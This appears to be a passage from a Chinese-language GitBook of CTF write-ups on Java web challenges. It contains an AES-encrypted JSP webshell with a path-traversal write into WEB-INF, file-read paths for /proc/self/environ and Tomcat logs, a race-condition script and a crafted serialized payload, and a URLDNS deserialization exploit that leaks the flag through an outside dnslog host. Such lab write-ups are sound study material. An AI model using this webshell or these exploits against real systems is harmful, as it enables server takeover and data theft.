<pre><code>&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;)){String k=&quot;e45e329feb5d925b&quot;;session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%&gt;
</code></pre><p>&#x7136;&#x540E;&#x5199;&#x5728; <code>../../../../../../../home/apache-tomcat-8.5.45/webapps/ROOT/WEB-INF/shell.jsp</code>, &#x8986;&#x5199;web.xml</p>
<pre><code>    &lt;servlet&gt;
        &lt;servlet-name&gt;shell&lt;/servlet-name&gt;
        &lt;jsp-file&gt;/WEB-INF/shell.jsp&lt;/jsp-file&gt;
    &lt;/servlet&gt;
    &lt;servlet-mapping&gt;
        &lt;servlet-name&gt;shell&lt;/servlet-name&gt;
        &lt;url-pattern&gt;/ricky&lt;/url-pattern&gt;
    &lt;/servlet-mapping&gt;
</code></pre><p>&#x5BF9;&#x8DEF;&#x5F84;&#x7684;&#x5339;&#x914D;&#x4E5F;&#x9700;&#x8981;&#x6539;&#x4E00;&#x4E0B;, &#x4E0D;&#x80FD;&#x76F4;&#x63A5;&#x5339;&#x914D;&#x6211;&#x4EEC;&#x7684;&#x8DEF;&#x5F84;&#x5426;&#x5219;&#x4F1A;&#x76F4;&#x63A5;&#x8FD4;&#x56DE;404</p>
<pre><code>    &lt;filter-mapping&gt;
        &lt;filter-name&gt;routerFilter&lt;/filter-name&gt;
        &lt;url-pattern&gt;/404.html&lt;/url-pattern&gt;
        &lt;url-pattern&gt;/s/*&lt;/url-pattern&gt;
        &lt;dispatcher&gt;REQUEST&lt;/dispatcher&gt;
    &lt;/filter-mapping&gt;
</code></pre><p>&#x4F9D;&#x6B21;&#x5199;&#x5165;&#x540E;&#x7B49;&#x5F85;&#x4E9B;&#x8BB8;&#x8BBF;&#x95EE; /ricky &#x5373;&#x53EF;getshell, &#x6839;&#x76EE;&#x5F55; cat /ctfshowflag &#x5373;&#x53EF;</p>
<h2 id="vnctf2022easyj4va">[VNCTF2022]easyJ4va</h2>
<p>&#x9996;&#x5148;&#x662F;&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x8BFB;&#x53D6;, &#x6839;&#x636E;&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x786E;&#x5B9A;tomcat&#x5177;&#x4F53;&#x76EE;&#x5F55;&#x7136;&#x540E;&#x641C;&#x7D22;</p>
<pre><code>file:///proc/self/environ
file:///usr/local/tomcat/webapps/ROOT/WEB-INF/web.xml
file:///usr/local/tomcat/logs/localhost.2022-02-12.log
file:///usr/local/tomcat/logs/localhost_access_log.2022-02-12.txt
</code></pre><p>&#x901A;&#x8FC7;&#x65E5;&#x5FD7;&#x6210;&#x529F;&#x627E;&#x5230;&#x6076;&#x610F;&#x8DEF;&#x7531;&#x4EE5;&#x53CA;&#x5EF6;&#x4F38;</p>
<pre><code>file:///usr/local/tomcat/webapps/ROOT/WEB-INF/classes/servlet/HelloWorldServlet.class
</code></pre><p>GET&#x90E8;&#x5206;&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5;&#x591A;&#x7EBF;&#x7A0B;&#x7206;&#x7834;&#x83B7;&#x53D6;, &#x9700;&#x8981;&#x4E24;&#x4E2A;&#x4E0D;&#x540C;&#x7684;name(&#x4E00;&#x4E2A;&#x968F;&#x4FBF;&#x5199;, &#x53E6;&#x4E00;&#x4E2A;&#x4E3A;vnctf2022), &#x6BD4;&#x8D5B;&#x65F6;&#x9760;&#x7740;&#x65E5;&#x5FD7;&#x8BFB;&#x53D6;&#x5230;&#x5176;&#x4ED6;&#x4EBA;&#x7206;&#x7834;&#x7684;key</p>
<pre><code>    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        String reqName = req.getParameter(&quot;name&quot;);
        if (reqName != null) {
            this.name = reqName;
        }

        if (Secr3t.check(this.name)) {
            this.Response(resp, &quot;no vnctf2022!&quot;);
        } else {
            if (Secr3t.check(this.name)) {
                this.Response(resp, &quot;The Key is &quot; + Secr3t.getKey());
            }

        }
    }
</code></pre><p>&#x540E;&#x7EED;&#x5C1D;&#x8BD5;&#x53D1;&#x73B0;&#x53EF;&#x884C;, &#x5229;&#x7528;&#x6B64;&#x7ADE;&#x4E89;&#x811A;&#x672C;, &#x8003;&#x5BDF; servlet &#x7684;&#x7EBF;&#x7A0B;&#x5B89;&#x5168;&#x95EE;&#x9898;</p>
<p>&#x53C2;&#x8003;: <a href="https://y4tacker.github.io/2022/02/03/year/2022/2/Servlet%E7%9A%84%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/" target="_blank">https://y4tacker.github.io/2022/02/03/year/2022/2/Servlet%E7%9A%84%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/</a></p>
<pre><code class="lang-p&apos;y&apos;t"># -*-coding:utf-8-*-
import requests
import threading
import time

url = &quot;http://432a4451-aa66-4ccd-a1a0-da92bf9c8192.node4.buuoj.cn:81/evi1?name={}&quot;

def ricky():
    res = requests.get(url=url.format(&quot;ricky&quot;))
    if &quot;The Key is&quot; in res.text:
        print(res.text)
    else:
        print(res.text)

def vnctf2022():
    res = requests.get(url=url.format(&quot;vnctf2022&quot;))
    if &quot;The Key is&quot; in res.text:
        print(res.text)
    else:
        print(res.text)

if __name__ == &apos;__main__&apos;:
    event = threading.Event()
    while True:
        threading.Thread(target=ricky, args=()).start()
        threading.Thread(target=vnctf2022, args=()).start()
        time.sleep(0.5)
        event.set()
</code></pre>
<p>POST&#x90E8;&#x5206;&#x662F;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x53CD;&#x5E8F;&#x5217;&#x5316;</p>
<pre><code>    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        String key = req.getParameter(&quot;key&quot;);
        String text = req.getParameter(&quot;base64&quot;);
        if (Secr3t.getKey().equals(key) &amp;&amp; text != null) {
            Decoder decoder = Base64.getDecoder();
            byte[] textByte = decoder.decode(text);
            User u = (User)SerAndDe.deserialize(textByte);
            if (this.user.equals(u)) {
                this.Response(resp, &quot;Deserialize&#x2026;&#x2026; Flag is &quot; + Secr3t.getFlag().toString());
            }
        } else {
            this.Response(resp, &quot;KeyError&quot;);
        }

    }
</code></pre><p>&#x7531;&#x4E8E; transient &#x4E0D;&#x80FD;&#x76F4;&#x63A5;&#x88AB; readObject &#x6216; writeObject &#x65B9;&#x6CD5;&#x5E8F;&#x5217;&#x5316;, &#x9700;&#x8981;&#x5355;&#x72EC;&#x5206;&#x5F00;&#x8D4B;&#x503C;</p>
<p>&#x53C2;&#x8003;:</p>
<ul>
<li><p><a href="https://stackoverflow.com/questions/17235877/need-of-defaultreadobject-and-defaultwriteobject" target="_blank">https://stackoverflow.com/questions/17235877/need-of-defaultreadobject-and-defaultwriteobject</a></p>
</li>
<li><p><a href="https://www.coder.work/article/2812174" target="_blank">https://www.coder.work/article/2812174</a></p>
</li>
</ul>
<p>&#x6839;&#x636E;&#x9898;&#x610F;&#x6525;&#x5199;&#x5E8F;&#x5217;&#x5316;, &#x5355;&#x72EC;&#x63D0;&#x53D6; height &#x503C;&#x5E76;&#x8D4B;&#x503C;&#x800C;&#x4E0D;&#x662F;&#x5C06; height &#x5E8F;&#x5217;&#x5316;</p>
<pre><code>    private void readObject(ObjectInputStream s) throws IOException, ClassNotFoundException {
        s.defaultReadObject();
        this.height = (String)s.readObject();
    }

    private void writeObject(ObjectOutputStream s) throws IOException {
        s.defaultWriteObject();
        s.writeObject(&quot;180&quot;);
    }
</code></pre><p>&#x6700;&#x7EC8;payload</p>
<pre><code>evi1?base64=rO0ABXNyAAtlbnRpdHkuVXNlcm1aqowD0DcIAwACTAADYWdldAASTGphdmEvbGFuZy9TdHJpbmc7TAAEbmFtZXEAfgABeHB0AAM2NjZ0AAttNG5fcTF1XzY2NnQAAzE4MHg=&amp;key=YYixtWPfKHsBvjELiwa90ZmFhuMcskBZ
</code></pre><h2 id="i&#x6625;&#x79CB;2021&#x4F20;&#x8BF4;&#x6BBF;&#x5802;easy-java">[i&#x6625;&#x79CB;2021&#x4F20;&#x8BF4;&#x6BBF;&#x5802;]easy java</h2>
<p>URLDNS&#x63A2;&#x6D4B;gadget&#x53C2;&#x8003;: <a href="https://bishopfox.com/blog/gadgetprobe" target="_blank">https://bishopfox.com/blog/gadgetprobe</a></p>
<p>GadgetProbe&#x4E0B;&#x8F7D;: <a href="https://github.com/BishopFox/GadgetProbe/releases/tag/v1.0" target="_blank">https://github.com/BishopFox/GadgetProbe/releases/tag/v1.0</a></p>
<p>&#x4E3B;&#x8981;&#x770B;Flag&#x7C7B;</p>
<pre><code class="lang-java">    <span class="hljs-function"><span class="hljs-keyword">public</span> Flag <span class="hljs-title">getFlagInstance</span><span class="hljs-params">(Flag flagTemplate)</span> <span class="hljs-keyword">throws</span> Exception </span>{
            <span class="hljs-keyword">if</span> (create){
            <span class="hljs-comment">// flag&#x5F00;&#x5934;&#x7684;&#x503C;&#x5BF9;&#x4E86;&#x5C31;&#x4F1A;&#x8FD4;&#x56DE;Flag&#x5BF9;&#x8C61;, &#x5426;&#x5219;&#x7EC8;&#x6B62;&#x672C;&#x6B21;&#x8FD0;&#x884C;</span>
            <span class="hljs-keyword">if</span> (!flagInstance.flag.startsWith(flagTemplate.flag)){
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> Exception(<span class="hljs-string">&quot;flag not valid&quot;</span>);
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-keyword">return</span> flagTemplate;
            }
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">return</span> flagInstance;
        }
    }


    <span class="hljs-function"><span class="hljs-keyword">private</span> Object <span class="hljs-title">readResolve</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception</span>{
        <span class="hljs-comment">// &#x53CD;&#x5E8F;&#x5217;&#x5316;&#x9996;&#x5148;&#x89E6;&#x53D1;&#x91CD;&#x5199;&#x7684; readResolve</span>
        <span class="hljs-keyword">return</span> getFlagInstance(<span class="hljs-keyword">this</span>);
    }
</code></pre>
<p>&#x53C2;&#x8003; GadgetProbe &#x53EF;&#x4EE5;&#x5F97;&#x77E5;&#x662F;&#x91C7;&#x7528; LinkedHashMap &#x7ED3;&#x5408; URLDNS &#x89E6;&#x53D1;&#x7684;&#x63A2;&#x6D4B;gadget, &#x5F53;flag&#x5F00;&#x5934;&#x7684;&#x503C;&#x8F93;&#x5165;&#x6B63;&#x786E;&#x65F6;&#x8FD4;&#x56DE;&#x5BF9;&#x8C61;&#x81F4;&#x4F7F;&#x6574;&#x4E2A;&#x7A0B;&#x5E8F;&#x6B63;&#x5E38;&#x8FD0;&#x884C;, &#x987A;&#x5229;&#x89E6;&#x53D1;DNS, &#x53CD;&#x6B63;&#x4F1A;&#x56E0;Exception&#x63D0;&#x524D;&#x4E2D;&#x65AD;&#x53CD;&#x5E8F;&#x5217;&#x5316;, &#x65E0;&#x6CD5;&#x89E6;&#x53D1;DNS, &#x53C2;&#x8003;&#x6525;&#x5199;EXP&#x5373;&#x53EF;</p>
<pre><code class="lang-java"><span class="hljs-keyword">package</span> exploit;

<span class="hljs-keyword">import</span> com.web.simplejava.model.Flag;
<span class="hljs-keyword">import</span> org.springframework.http.HttpEntity;
<span class="hljs-keyword">import</span> org.springframework.http.ResponseEntity;
<span class="hljs-keyword">import</span> org.springframework.web.client.RestTemplate;

<span class="hljs-keyword">import</span> java.lang.reflect.Field;
<span class="hljs-keyword">import</span> java.net.URI;
<span class="hljs-keyword">import</span> java.net.URL;
<span class="hljs-keyword">import</span> java.util.LinkedHashMap;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">exp</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGETParam</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception</span>{
        URI url = <span class="hljs-keyword">new</span> URI(<span class="hljs-string">&quot;http://localhost:8080/flag&quot;</span>);
        HttpEntity&lt;<span class="hljs-keyword">byte</span>[]&gt; requestEntity = <span class="hljs-keyword">new</span> HttpEntity&lt;&gt;(Serializables.serialize(obj));
        RestTemplate restTemplate = <span class="hljs-keyword">new</span> RestTemplate();
        ResponseEntity&lt;String&gt; res = restTemplate.postForEntity(url, requestEntity, String.class);
        System.out.println(res.getStatusCodeValue());
        System.out.println(res.getBody());
    }
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>{
        String dic = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz0123456789-&quot;</span>;

        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;i &lt; dic.length(); i++){
            <span class="hljs-keyword">char</span> ch = dic.charAt(i);
            Flag clazz = <span class="hljs-keyword">new</span> Flag(<span class="hljs-string">&quot;flag{&quot;</span> + ch);
            LinkedHashMap hm = <span class="hljs-keyword">new</span> LinkedHashMap();

            URL url = <span class="hljs-keyword">new</span> URL(<span class="hljs-string">&quot;http://r&quot;</span> + ch + <span class="hljs-string">&quot;.e6l4.dnslog.plus&quot;</span>);

            Field f = Class.forName(<span class="hljs-string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);
            f.setAccessible(<span class="hljs-keyword">true</span>);

            f.set(url, <span class="hljs-number">0xaa</span>);
            hm.put(<span class="hljs-string">&quot;test&quot;</span>, clazz);
            hm.put(url,<span class="hljs-string">&quot;test&quot;</span>);
            f.set(url, -<span class="hljs-number">1</span>);

            exp.doGETParam(hm);
        }
    }
}
</code></pre>
<p>&#x6839;&#x636E;DNS log&#x67E5;&#x770B;&#x5224;&#x65AD;&#x51FA;&#x7684;&#x5B57;&#x6BCD;, &#x4E00;&#x6B21;&#x4E00;&#x4F4D;, &#x9664;&#x975E;&#x5199;&#x5165;&#x6821;&#x9A8C;DNS&#x89E6;&#x53D1;&#x7684;&#x51FD;&#x6570;(&#x5B9E;&#x73B0;&#x96BE;&#x5EA6;&#x8F83;&#x5927;&#x4E14;&#x5BB9;&#x9519;&#x7387;&#x5C0F;)</p>
<h2 id="">...</h2>

                                
                                </section>
                            
    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

                        </div>
                    </div>
                
            </div>

            
                
                <a href="ROME逐步分析.html" class="navigation navigation-prev navigation-unique" aria-label="Previous page: ROME逐步分析">
                    <i class="fa fa-angle-left"></i>
                </a>
                
                
            
        
    </div>

    <script>
        var gitbook = gitbook || [];
        gitbook.push(function() {
            gitbook.page.hasChanged({"page":{"title":"Java相关题型复现","level":"1.6","depth":1,"previous":{"title":"ROME逐步分析","level":"1.5","depth":1,"path":"javanote/ROME逐步分析.md","ref":"javanote/ROME逐步分析.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["-lunr","-search","search-pro","github"],"pluginsConfig":{"github":{"url":"https://github.com/AmTrain-Ricky/amtrain-ricky.github.io"},"search-pro":{},"highlight":{},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css"}},"file":{"path":"javanote/javatest.md","mtime":"2022-02-17T19:46:00.036Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2022-07-03T12:32:36.343Z"},"basePath":"..","book":{"language":""}});
        });
    </script>
</div>

        
    <script src="../gitbook/gitbook.js"></script>
    <script src="../gitbook/theme.js"></script>
    
        
        <script src="../gitbook/gitbook-plugin-search-pro/jquery.mark.min.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-search-pro/search.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-github/plugin.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
        
    

    </body>
</html>

